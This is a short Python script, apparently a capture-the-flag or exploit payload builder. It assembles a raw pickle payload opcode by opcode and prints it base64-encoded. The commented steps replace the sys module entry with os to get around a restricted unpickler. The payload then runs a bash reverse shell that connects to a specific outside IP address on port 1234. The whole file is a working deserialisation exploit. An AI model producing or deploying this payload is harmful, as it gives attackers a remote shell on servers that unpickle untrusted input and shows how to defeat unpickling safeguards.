import pickle
import base64

code = b''.join([
    # mem[0] = stack[-1] = sys.modules
    pickle.GLOBAL, b'sys\n', b'modules\n',
    pickle.PUT, b'0\n',

    # sys.modules['sys'] = sys.modules
    pickle.STRING, b"'sys'\n",
    pickle.GLOBAL, b'sys\n', b'modules\n',
    pickle.SETITEM,
    pickle.POP,

    # mem[1] = sys.get('os')
    #   ~= sys.modules['os'] ~= <module 'os'>
    pickle.GLOBAL, b'sys\n', b'get\n',
    pickle.MARK,
    pickle.STRING, b"'os'\n",
    pickle.TUPLE,
    pickle.REDUCE,
    pickle.PUT, b'1\n',
    pickle.POP,

    # stack[-1] = mem[1] ~= <module 'os'>
    # stack[-2] = 'sys'
    # stack[-3] = mem[0] ~= sys.modules
    pickle.GET, b'0\n',
    pickle.STRING, b"'sys'\n",
    pickle.GET, b'1\n',

    # sys.modules['sys] = <module 'os'>
    pickle.SETITEM,

    # sys.system ~= <module 'os'>.system
    pickle.GLOBAL, b'sys\n', b'system\n',
    pickle.MARK,
    pickle.STRING, b"'bash -c \"bash -i >&/dev/tcp/140.113.128.168/1234 0>&1\"'\n",
    pickle.TUPLE,
    pickle.REDUCE,

    pickle.STOP
])

print(base64.b64encode(code))
